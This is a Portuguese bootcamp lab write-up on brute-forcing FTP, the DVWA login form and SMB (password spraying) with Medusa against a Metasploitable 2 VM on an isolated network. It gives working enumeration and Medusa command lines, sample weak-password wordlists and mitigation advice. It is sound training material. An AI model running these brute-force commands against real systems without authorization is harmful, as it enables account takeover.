# Projeto: Testes de Força Bruta com Kali + Medusa

**Módulo:** *Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux* — Bootcamp Santander - Cibersegurança 2025

> **Observação importante:** este projeto foi feito como um laboratório de aprendizado. Execute testes apenas em VMs/ambientes que você controla ou com autorização explícita.

## Sobre este projeto

Criei um laboratório com **Kali Linux** e **Metasploitable 2** para entender, na prática, como funcionam ataques de força bruta e, mais importante, como defender sistemas contra eles. Aqui está o passo a passo do que configurei, os comandos que rodei, o que deu certo e o que eu recomendo fazer para mitigar riscos.

## Objetivo (na prática)

* Montar duas VMs (Kali e Metasploitable) em rede isolada para testes.
* Usar o **Medusa** para simular ataques em FTP, formulários web (DVWA) e SMB (password spraying).
* Documentar wordlists, comandos, resultados e recomendações.

## Ferramentas e ambiente

* VirtualBox
* Kali Linux (VM)
* Metasploitable 2 (VM vulnerável)
* Ferramentas: `medusa`, `nmap`, `enum4linux`, `smbclient`, `dirb`

## Como montei o ambiente (passo a passo simples)

1. Criei duas VMs no VirtualBox: Kali e Metasploitable 2.
2. Configurei a rede como **Host-only** para isolar o laboratório.
3. Testei a conectividade: `ping -c 3 192.168.56.102` — se responde, as VMs estão se falando.

> Dica: se o ping não funcionar, confira o adaptador Host-only no VirtualBox e se ambas as VMs estão na mesma sub-rede virtual.

## O que fiz — resumo das etapas

### 1) Enumeração

* `nmap -A 192.168.56.102` — descobri serviços e versões.
* `enum4linux -a 192.168.56.102 | tee enum4output.txt` — informações do SMB.
* `dirb http://<host>` — procura de diretórios em aplicações web.

### 2) Força bruta em FTP com Medusa

* Montei `users.txt` e `pass.txt` com exemplos simples.
* Exemplos de execução:

  * `medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6`
  * `medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6 > bruteforce_medusa_ftp.txt`

### 3) Ataque a formulário web (DVWA)

* Usei o módulo `http` do Medusa com os parâmetros de `PAGE` e `FORM`:

  * `medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6 > medusa_bruteforce_dvwa.txt`
* Ajustei `PAGE`, `FORM` e `FAIL` conforme o HTML do DVWA para que o Medusa reconhecesse falhas de login.

### 4) Password spraying em SMB

* Criei `smb_users.txt` e `senhas_spray.txt` com listas pequenas.
* Rodei:

  * `medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50`
* Conferi compartilhamentos com: `smbclient -L //192.168.56.102 -U msfadmin`

## Wordlists (exemplo)

* `users.txt`:

```
user
msfadmin
admin
root
service
```

* `pass.txt` / `senhas_spray.txt`:

```
123456
password
qwerty
msfadmin
Welcome123
```

## Comandos executados (resumido)

Mantive um registro dos comandos — corrigi pequenos erros antes de rodar. Entre os comandos estão:

* `ping -c 3 192.168.56.102`
* `nmap -A 192.168.56.102`
* `nmap -A 192.168.56.102 > enumeracao_meta2.txt`
* `ftp 192.168.56.102`
* `nmap -sV 192.168.56.102`
* `echo -e 'user\nmsfadmin\nadmin\nroot'> users.txt`
* `echo -e '123456\npassword\nqwerty\nmsfadmin'> pass.txt`
* `medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6 > bruteforce_medusa_ftp.txt`
* `medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6 > medusa_bruteforce_dvwa.txt`
* `enum4linux -a 192.168.56.102 | tee enum4output.txt`
* `echo -e 'user\nmsfadmin\nservice'> smb_users.txt`
* `echo -e 'password\n123456\nWelcome123\nmsfadmin'> senhas_spray.txt`
* `medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50`
* `smbclient -L //192.168.56.102 -U msfadmin`

> Observação: o log original tinha alguns erros de digitação (ex.: `cart` -> `cat`). No documento está a versão corrigida para facilitar reprodução.

## O que observei (principais aprendizados)

* Senhas fracas ainda funcionam em ambientes vulneráveis.
* Ataques a formulários exigem atenção ao HTML e às mensagens de erro.
* Salvar a saída em arquivos facilita muito a análise depois.
* Revisar comandos antes de rodar evita perda de tempo com erros simples.

## Recomendações práticas

* Implementar bloqueio temporário após várias tentativas falhas.
* Exigir senhas fortes e políticas de expiração.
* Habilitar MFA quando possível.
* Monitorar logs e gerar alertas para muitas tentativas de login.
* Desativar serviços desnecessários e aplicar o princípio do menor privilégio.

## Próximos passos sugeridos

1. Automatizar a geração das wordlists com um script.
2. Adicionar screenshots das saídas para documentação.
3. Registrar métricas (tempo e número de tentativas) para cada teste.

---

Se quiser, posso ajustar o tom ainda mais (mais informal ou mais técnico), adicionar screenshots ou gerar scripts para automatizar os testes.
